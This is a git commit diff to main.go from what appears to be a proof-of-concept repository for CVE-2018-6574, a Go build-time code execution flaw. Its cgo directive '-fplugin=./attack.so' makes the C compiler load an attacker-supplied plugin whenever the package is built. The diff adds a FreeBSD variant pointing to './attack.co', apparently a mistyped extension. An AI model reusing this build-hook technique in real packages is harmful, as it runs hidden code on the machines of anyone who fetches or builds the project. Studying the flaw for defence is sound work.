9975a3bdbb6594733d1cca29e840f691bf9b0efa
sirius-bl4ck <66516992+sirius-bl4ck@users.noreply.github.com>
2020-07-02 16:30:09 +0530

    Update main.go

--- main.go
+++ main.go
@@ -2,11 +2,10 @@ package main
 
 /*
 #cgo linux CFLAGS: -fplugin=./attack.so
-
+#cgo freebsd CFLAGS: -fplugin=./attack.co
 void echo() {
   printf("link: https://github.com/sirius-bl4ck/cve2018-6574");
 }
-
 */
 import "C"
 
